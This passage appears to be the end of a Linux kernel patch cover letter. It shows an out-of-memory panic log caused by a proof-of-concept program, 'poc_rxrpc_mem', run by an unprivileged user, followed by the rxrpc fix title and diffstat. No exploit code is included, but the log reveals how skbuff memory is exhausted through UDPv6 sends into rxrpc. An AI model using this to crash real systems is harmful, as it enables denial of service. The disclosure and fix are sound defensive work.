[   58.017418][ T9986] cifs_io_request          105KB        111KB
[   58.017431][ T9986] nfs_commit_data           24KB         31KB
[   58.017444][ T9986] nfs_write_data            40KB         47KB
[   58.017459][ T9986] jbd2_inode                10KB         11KB
[   58.017471][ T9986] ext4_system_zone           0KB          3KB
[   58.017484][ T9986] ext4_io_end_vec            3KB          7KB
[   58.017499][ T9986] fasync_cache               9KB         11KB
[   58.017511][ T9986] kvm_gmem_inode_cache         15KB         15KB
[   58.017524][ T9986] rpc_buffers               25KB         31KB
[   58.017536][ T9986] rpc_tasks                  8KB         11KB
[   58.017548][ T9986] UNIX-STREAM               68KB        223KB
[   58.017561][ T9986] UNIX                      59KB        127KB
[   58.017573][ T9986] tcp_bind2_bucket          14KB         16KB
[   58.017584][ T9986] tcp_bind_bucket           15KB         16KB
[   58.017595][ T9986] ip_fib_trie                7KB          8KB
[   58.017609][ T9986] ip_fib_alias              10KB         11KB
[   58.017620][ T9986] rtable                     7KB         12KB
[   58.017631][ T9986] RAW                       22KB         31KB
[   58.017642][ T9986] UDP                       19KB         63KB
[   58.017652][ T9986] request_sock_TCP           6KB         15KB
[   58.017663][ T9986] TCP                       74KB         87KB
[   58.017674][ T9986] fs_bio_integrity           7KB          8KB
[   58.017686][ T9986] hugetlbfs_inode_cache         28KB         31KB
[   58.017697][ T9986] netfs_subrequest          35KB         37KB
[   58.017709][ T9986] netfs_request            105KB        111KB
[   58.017720][ T9986] bio-288                   31KB         31KB
[   58.017736][ T9986] bio-328                   12KB         15KB
[   58.017748][ T9986] ep_head                    4KB         15KB
[   58.017759][ T9986] eventpoll_pwq              8KB         27KB
[   58.017771][ T9986] eventpoll_epi             33KB         55KB
[   58.017782][ T9986] inotify_inode_mark         36KB         39KB
[   58.017793][ T9986] bpf_fs_inode_cache         14KB         15KB
[   58.017807][ T9986] sgpool-128               140KB        148KB
[   58.017820][ T9986] sgpool-64                 87KB         95KB
[   58.017832][ T9986] sgpool-32                 38KB         47KB
[   58.017843][ T9986] sgpool-16                 19KB         45KB
[   58.017854][ T9986] sgpool-8                  19KB         22KB
[   58.017864][ T9986] bio_crypt_ctx              9KB         11KB
[   58.017876][ T9986] bio_integrity_data          7KB          8KB
[   58.017887][ T9986] request_queue            195KB        211KB
[   58.017898][ T9986] blkdev_ioc                12KB         19KB
[   58.017909][ T9986] bio-200                   70KB         71KB
[   58.017920][ T9986] biovec-max               437KB        505KB
[   58.017932][ T9986] biovec-128                57KB         63KB
[   58.017952][ T9986] biovec-64                 56KB         63KB
[   58.017964][ T9986] biovec-16                 11KB         15KB
[   58.017976][ T9986] uid_cache                 13KB         18KB
[   58.017988][ T9986] dmaengine-unmap-256         26KB         30KB
[   58.122516][ T9986] dmaengine-unmap-128         14KB         15KB
[   58.123647][ T9986] dmaengine-unmap-16          7KB          8KB
[   58.123666][ T9986] dmaengine-unmap-2          3KB          4KB
[   58.123677][ T9986] QIPCRTR                   18KB         31KB
[   58.123690][ T9986] audit_buffer              10KB         23KB
[   58.123820][ T9986] skbuff_small_head     588666KB     588670KB
[   58.123833][ T9986] skbuff_fclone_cache          7KB         30KB
[   58.123844][ T9986] skbuff_head_cache     226372KB     226372KB
[   58.123855][ T9986] configfs_dir_cache         15KB         16KB
[   58.123867][ T9986] file_lock_cache           10KB         23KB
[   58.123878][ T9986] file_lock_ctx             29KB         31KB
[   58.123890][ T9986] fsnotify_inode_mark_connector         22KB         27KB
[   58.123903][ T9986] taskstats                 44KB         47KB
[   58.123925][ T9986] mem_cgroup_per_node         96KB        122KB
[   58.123937][ T9986] mem_cgroup               110KB        120KB
[   58.123949][ T9986] proc_dir_entry           277KB        292KB
[   58.123960][ T9986] pde_opener                 3KB          3KB
[   58.123971][ T9986] seq_file                  16KB         23KB
[   58.123982][ T9986] sigqueue                   4KB         15KB
[   58.123996][ T9986] shmem_inode_cache       8366KB       8485KB
[   58.124011][ T9986] kernfs_iattrs_cache        134KB        153KB
[   58.124047][ T9986] kernfs_node_cache      17766KB      17977KB
[   58.124060][ T9986] mnt_cache                 47KB         86KB
[   58.124081][ T9986] filp                     213KB        795KB
[   58.124113][ T9986] names_cache               19KB         28KB
[   58.124124][ T9986] net_namespace             38KB         58KB
[   58.124136][ T9986] ima_iint_cache           134KB        135KB
[   58.124148][ T9986] hashtab_node             274KB        274KB
[   58.124160][ T9986] ebitmap_node            1154KB       1169KB
[   58.124171][ T9986] avtab_node              4975KB       4976KB
[   58.124189][ T9986] avc_node                  60KB         95KB
[   58.124236][ T9986] lsm_inode_cache         3820KB       4522KB
[   58.124251][ T9986] lsm_file_cache            34KB        192KB
[   58.124262][ T9986] key_jar                   32KB         47KB
[   58.124273][ T9986] uts_namespace             45KB         46KB
[   58.124285][ T9986] nsproxy                   11KB         15KB
[   58.124318][ T9986] vm_area_struct           841KB       1443KB
[   58.124329][ T9986] fs_cache                  15KB         32KB
[   58.124341][ T9986] files_cache               59KB        175KB
[   58.124363][ T9986] task_exec_state            1KB         16KB
[   58.124386][ T9986] signal_cache             556KB       1756KB
[   58.124403][ T9986] sighand_cache            709KB       1924KB
[   58.124423][ T9986] task_struct             2476KB       3812KB
[   58.124448][ T9986] cred                      94KB        292KB
[   58.124464][ T9986] anon_vma_chain           213KB        401KB
[   58.206961][ T9986] anon_vma                 267KB        421KB
[   58.207972][ T9986] pid                      111KB        255KB
[   58.210498][ T9986] Acpi-Operand              53KB        110KB
[   58.213133][ T9986] Acpi-ParseExt              4KB         19KB
[   58.213156][ T9986] Acpi-Parse                 2KB         19KB
[   58.213169][ T9986] Acpi-State                 5KB         19KB
[   58.213182][ T9986] Acpi-Namespace            28KB         32KB
[   58.213196][ T9986] numa_policy                3KB          4KB
[   58.213209][ T9986] perf_event                15KB         31KB
[   58.213222][ T9986] trace_event_file         547KB        548KB
[   58.213245][ T9986] ftrace_event_field       1057KB       1059KB
[   58.213288][ T9986] pool_workqueue           516KB        528KB
[   58.213318][ T9986] maple_node               517KB       1576KB
[   58.213332][ T9986] mm_struct                 82KB        382KB
[   58.213354][ T9986] vmap_area                420KB        558KB
[   58.213396][ T9986] debug_objects_cache       1532KB       1892KB
[   58.213412][ T9986] page->ptl                 35KB        106KB
[   58.213424][ T9986] kmalloc-cg-8k            160KB        160KB
[   58.213438][ T9986] kmalloc-cg-4k            792KB        928KB
[   58.213452][ T9986] kmalloc-cg-2k           1060KB       1216KB
[   58.213465][ T9986] kmalloc-cg-1k            204KB        352KB
[   58.213478][ T9986] kmalloc-cg-512            86KB        192KB
[   58.213491][ T9986] kmalloc-cg-256            61KB         72KB
[   58.213505][ T9986] kmalloc-cg-128          1039KB       1056KB
[   58.213522][ T9986] kmalloc-cg-64             53KB        244KB
[   58.213537][ T9986] kmalloc-cg-32            424KB        448KB
[   58.213565][ T9986] kmalloc-cg-16              3KB          8KB
[   58.213577][ T9986] kmalloc-cg-8               5KB          8KB
[   58.213589][ T9986] kmalloc-cg-192            27KB         28KB
[   58.213623][ T9986] kmalloc-cg-96            350KB        368KB
[   58.261936][ T9986] kmalloc-8k              1664KB       1888KB
[   58.261990][ T9986] kmalloc-4k              3120KB       7104KB
[   58.262003][ T9986] kmalloc-2k             10564KB      10592KB
[   58.262015][ T9986] kmalloc-1k              3506KB       3520KB
[   58.262036][ T9986] kmalloc-512             5402KB       6016KB
[   58.262054][ T9986] kmalloc-256             3358KB       3456KB
[   58.262081][ T9986] kmalloc-128              890KB       1044KB
[   58.262118][ T9986] kmalloc-64              3014KB       3248KB
[   58.262151][ T9986] kmalloc-32               457KB       1112KB
[   58.262166][ T9986] kmalloc-16               517KB        532KB
[   58.262180][ T9986] kmalloc-8                378KB        396KB
[   58.262206][ T9986] kmalloc-192              685KB        860KB
[   58.262227][ T9986] kmalloc-96              1233KB       1328KB
[   58.262239][ T9986] kmem_cache_node          108KB        110KB
[   58.262250][ T9986] kmem_cache               180KB        180KB
[   58.262267][ T9986] Memory cgroup min protection 0kB -- low protection 0kB
[   58.262278][ T9986] Tasks state (memory values in pages):
[   58.262287][ T9986] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[   58.262507][ T9986] [   4996]     0  4996     7999      270      228       41         1    86016        0          -250 systemd-journal
[   58.262533][ T9986] [   5005]     0  5005     9217     2826     2824        2         0    90112        0         -1000 systemd-udevd
[   58.262556][ T9986] [   8833]     0  8833    55235      419      317      102         0    69632        0             0 rsyslogd
[   58.262578][ T9986] [   9201]     0  9201    24973      356      354        2         0    77824        0             0 dhclient
[   58.262607][ T9986] [   9246]     0  9246      720       35       33        2         0    40960        0             0 agetty
[   58.262629][ T9986] [   9247]     0  9247      720       35       33        2         0    40960        0             0 agetty
[   58.262651][ T9986] [   9248]     0  9248      720       34       32        2         0    45056        0             0 agetty
[   58.262673][ T9986] [   9249]     0  9249      720       35       33        2         0    49152        0             0 agetty
[   58.262695][ T9986] [   9250]     0  9250      720       34       32        2         0    45056        0             0 agetty
[   58.262717][ T9986] [   9251]     0  9251      720       35       33        2         0    45056        0             0 agetty
[   58.262738][ T9986] [   9252]     0  9252     1101       36       34        2         0    45056        0             0 agetty
[   58.262760][ T9986] [   9253]     0  9253     3340      245      243        2         0    73728        0         -1000 sshd
[   58.262782][ T9986] [   9257]     0  9257    14097      392      391        1         0    81920        0             0 nginx
[   58.262804][ T9986] [   9258]    33  9258    14191      473      471        2         0    86016        0             0 nginx
[   58.262825][ T9986] [   9259]    33  9259    14191      473      471        2         0    86016        0             0 nginx
[   58.262848][ T9986] [   9969]     0  9969     1429      294       63      231         0    53248        0             0 bash
[   58.262873][ T9986] [   9972]     0  9972     3453      292      290        2         0    69632        0             0 sshd
[   58.262894][ T9986] [   9978]  1001  9978     3453      316      290       26         0    69632        0             0 sshd
[   58.262915][ T9986] [   9979]  1001  9979   246315      111       62       49         0   110592        0             0 poc_rxrpc_mem
[   58.262937][ T9986] [  10008]     0 10008     9217     2828     2826        2         0    69632        0             0 systemd-udevd
[   58.262958][ T9986] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[   58.311202][ T9986] CPU: 0 UID: 1001 PID: 9986 Comm: poc_rxrpc_mem Not tainted 7.3.0-rc1+ #2 PREEMPT(full)
[   58.312485][ T9986] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   58.314084][ T9986] Call Trace:
[   58.314583][ T9986]  <TASK>
[   58.314977][ T9986]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   58.315778][ T9986]  dump_stack (lib/dump_stack.c:129)
[   58.316318][ T9986]  vpanic (kernel/panic.c:651)
[   58.316923][ T9986]  ? __pfx_vpanic (kernel/panic.c:363)
[   58.317681][ T9986]  panic (kernel/panic.c:788)
[   58.318199][ T9986]  ? __pfx_panic (kernel/panic.c:741)
[   58.318780][ T9986]  ? dump_header (mm/oom_kill.c:475)
[   58.319386][ T9986]  out_of_memory (mm/oom_kill.c:1076 mm/oom_kill.c:1143)
[   58.320413][ T9986]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[   58.321310][ T9986]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[   58.322101][ T9986]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[   58.322987][ T9986]  ? stack_trace_save (kernel/stacktrace.c:122)
[   58.323623][ T9986]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
[   58.324856][ T9986]  ? stack_depot_save_flags (lib/stackdepot.c:667)
[   58.325538][ T9986]  ? __sanitizer_cov_trace_cmp4 (kernel/kcov.c:284)
[   58.326324][ T9986]  ? find_match (net/ipv6/route.c:806)
[   58.326933][ T9986]  ? kvm_clock_get_cycles (arch/x86/kernel/kvmclock.c:87)
[   58.327576][ T9986]  ? kasan_save_stack (mm/kasan/common.c:58)
[   58.328238][ T9986]  ? kasan_save_stack (mm/kasan/common.c:57)
[   58.328978][ T9986]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   58.329601][ T9986]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[   58.330253][ T9986]  allocate_slab (mm/slub.c:3347 mm/slub.c:3470)
[   58.330834][ T9986]  new_slab (mm/slub.c:3513)
[   58.331382][ T9986]  refill_objects (mm/slub.c:7410)
[   58.332163][ T9986]  ? __pcs_replace_empty_main (include/linux/local_lock_internal.h:62 mm/slub.c:4762)
[   58.332895][ T9986]  __pcs_replace_empty_main (mm/slub.c:2885 mm/slub.c:4774)
[   58.333743][ T9986]  kmem_cache_alloc_node_noprof (mm/slub.c:4850 mm/slub.c:4984 mm/slub.c:5068)
[   58.334438][ T9986]  ? kmalloc_reserve (net/core/skbuff.c:615)
[   58.335030][ T9986]  kmalloc_reserve (net/core/skbuff.c:615)
[   58.335642][ T9986]  __alloc_skb (net/core/skbuff.c:715)
[   58.336180][ T9986]  ? __alloc_skb (include/linux/bottom_half.h:20 net/core/skbuff.c:697)
[   58.336915][ T9986]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
[   58.337822][ T9986]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6796)
[   58.338451][ T9986]  ? __sanitizer_cov_trace_switch (kernel/kcov.c:347)
[   58.339358][ T9986]  sock_alloc_send_pskb (net/core/sock.c:3015)
[   58.340604][ T9986]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   58.341489][ T9986]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   58.342391][ T9986]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2847)
[   58.343102][ T9986]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   58.343785][ T9986]  ? ipv6_dev_get_saddr (include/linux/rcupdate.h:882 net/ipv6/addrconf.c:1916)
[   58.344422][ T9986]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   58.345157][ T9986]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
[   58.346979][ T9986]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   58.347777][ T9986]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   58.348518][ T9986]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
[   58.349367][ T9986]  ? ip6_mtu (net/ipv6/route.c:3290)
[   58.349956][ T9986]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
[   58.350594][ T9986]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
[   58.351217][ T9986]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   58.352042][ T9986]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
[   58.352742][ T9986]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   58.353531][ T9986]  udpv6_sendmsg (net/ipv6/udp.c:1720)
[   58.354292][ T9986]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[   58.355035][ T9986]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   58.355630][ T9986]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[   58.356278][ T9986]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
[   58.357498][ T9986]  ? __pfx_avc_has_perm (include/linux/rcupdate.h:878)
[   58.358210][ T9986]  ? sock_has_perm (security/selinux/hooks.c:4932)
[   58.358966][ T9986]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[   58.359843][ T9986]  inet6_sendmsg (net/ipv6/af_inet6.c:641)
[   58.360487][ T9986]  ? inet6_sendmsg (net/ipv6/af_inet6.c:641)
[   58.361121][ T9986]  __sys_sendto (net/socket.c:800 net/socket.c:815 net/socket.c:2281)
[   58.361733][ T9986]  ? __pfx___sys_sendto (net/socket.c:2235)
[   58.362396][ T9986]  ? rcu_is_watching (include/linux/context_tracking.h:128 kernel/rcu/tree.c:753)
[   58.363024][ T9986]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1544)
[   58.363732][ T9986]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[   58.364435][ T9986]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   58.365103][ T9986]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   58.365979][ T9986]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4488)
[   58.366685][ T9986]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:45)
[   58.367289][ T9986]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   58.367887][ T9986]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   58.368734][ T9986] RIP: 0033:0x423004
[   58.369281][ T9986] Code: 7d e8 89 4d d4 e8 ac e7 02 00 44 8b 4d d0 4c 8b 45 c8 89 c3 44 8b 55 d4 8b 7d e8 b8 2c 00 00 00 48 8b 55 d8 48 8b 75 e0 0f 05 <48> 3d 00 f0 ff ff 77 34 89 df 48 89 45 e8 e8 f9 e7 02 00 48 8b 45
All code
========
   0:	7d e8                	jge    0xffffffffffffffea
   2:	89 4d d4             	mov    %ecx,-0x2c(%rbp)
   5:	e8 ac e7 02 00       	call   0x2e7b6
   a:	44 8b 4d d0          	mov    -0x30(%rbp),%r9d
   e:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
  12:	89 c3                	mov    %eax,%ebx
  14:	44 8b 55 d4          	mov    -0x2c(%rbp),%r10d
  18:	8b 7d e8             	mov    -0x18(%rbp),%edi
  1b:	b8 2c 00 00 00       	mov    $0x2c,%eax
  20:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  24:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 34                	ja     0x66
  32:	89 df                	mov    %ebx,%edi
  34:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  38:	e8 f9 e7 02 00       	call   0x2e836
  3d:	48                   	rex.W
  3e:	8b                   	.byte 0x8b
  3f:	45                   	rex.RB

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 34                	ja     0x3c
   8:	89 df                	mov    %ebx,%edi
   a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   e:	e8 f9 e7 02 00       	call   0x2e80c
  13:	48                   	rex.W
  14:	8b                   	.byte 0x8b
  15:	45                   	rex.RB
[   58.371839][ T9986] RSP: 002b:00007f4cf3c491b0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
[   58.372915][ T9986] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000423004
[   58.374020][ T9986] RDX: 0000000000000024 RSI: 00007f4cd8000b70 RDI: 0000000000000009
[   58.375089][ T9986] RBP: 00007f4cf3c491f0 R08: 00000000290bab20 R09: 000000000000001c
[   58.376279][ T9986] R10: 0000000000000000 R11: 0000000000000293 R12: 000000000000b99d
[   58.377312][ T9986] R13: 0000000080173387 R14: 00000000005cce1c R15: 00000000290bab20
[   58.378355][ T9986]  </TASK>
[   58.379713][ T9986] Kernel Offset: disabled
[   58.380688][ T9986] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  rxrpc: fix encap_rcv skb accounting exhaustion

 net/rxrpc/ar-internal.h  |  1 +
 net/rxrpc/io_thread.c    | 77 ++++++++++++++++++++++++++++++++++++++--
 net/rxrpc/local_object.c | 24 +++++++++++--
 3 files changed, 98 insertions(+), 4 deletions(-)

-- 
2.43.0

